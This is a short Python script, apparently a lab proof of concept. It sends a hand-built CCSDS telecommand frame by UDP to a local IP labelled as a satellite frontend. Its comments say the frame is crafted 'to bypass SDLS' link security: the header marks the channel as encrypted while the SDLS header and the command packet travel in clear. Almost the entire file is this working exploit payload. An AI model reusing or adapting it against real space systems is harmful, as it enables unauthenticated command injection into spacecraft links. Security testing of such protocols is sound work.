import socket
import numpy as np
import time

def send_to_socket(IP, PORT, command):

	byte_message = bytes(command)

	opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	opened_socket.sendto(byte_message, (IP, PORT))	
	
	return

######

IP = "192.168.100.5"

# for SAT1 (Frontend in)
PORT = 8010

# attack is labeled on TF Header (6th bit of first octet set to 1, Ex. 0x20=00100000 becomes 00100100=0x24)

# TC to bypass SDLS ! 
command1 = [  												
0x24,0x01,0x10,0x11,0x00, 								# TF header (VCID = part of 3th byte) 3th byte =0x10 means VCID = 4 = encryption ON
0xC0,0x00,0x2C,								 	# SDLS header clear (segment header C0 + 2 bytes) - 8th byte = 0x2C means SPI is set to 44 (44 < 64 = NUM_SA)
0x18,0xC8,0xC0,0x00,0x00,0x01,0x00,0x00, 						# SPP = CAM NOOP in clear mode
0x93,0x78];   										# FEC

# NB: TF Header --> 0x20,0x01,0x10,0x11,0x00,   2th byte = SCID, 0x10-> VCID = 4, 0x11 --> = 17 length frame -1, 0x00 = frame sequence number. 

send_to_socket(IP, PORT, command1)
time.sleep(1);

